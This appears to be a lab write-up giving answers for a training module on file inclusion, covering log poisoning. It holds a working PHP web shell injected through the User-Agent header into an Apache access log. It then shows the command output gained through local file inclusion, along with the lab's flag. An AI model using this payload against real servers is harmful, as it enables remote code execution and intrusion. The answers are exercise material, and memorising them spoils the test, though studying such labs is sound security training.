# Section 08: Log Poisoning

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

Context:
- Catch the request with Burp Suite, and send the request:
```bash
GET /index.php?language=/var/log/apache2/access.log HTTP/1.1
Host: 154.57.164.67:31738
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ipt89qsrm7u4rbj76jcudh0koa
Connection: keep-alive
```
- The following requests send with `&cmd=<command>`:
```bash
&cmd=pwd => /var/www/html
```

**Answer:** `/var/www/html`

---

### 2. Try to use a different technique to gain RCE and read the flag at /

Context:
```bash
/var/log/apache2/access.log&cmd=ls%20/
bin
boot
c85ee5082f4c723ace6c0796e3a3db09.txt
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

/var/log/apache2/access.log&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt
HTB{1095_5#0u1d_n3v3r_63_3xp053d}
```

**Answer:** ``

---

[Back to Module Index](./README.md)
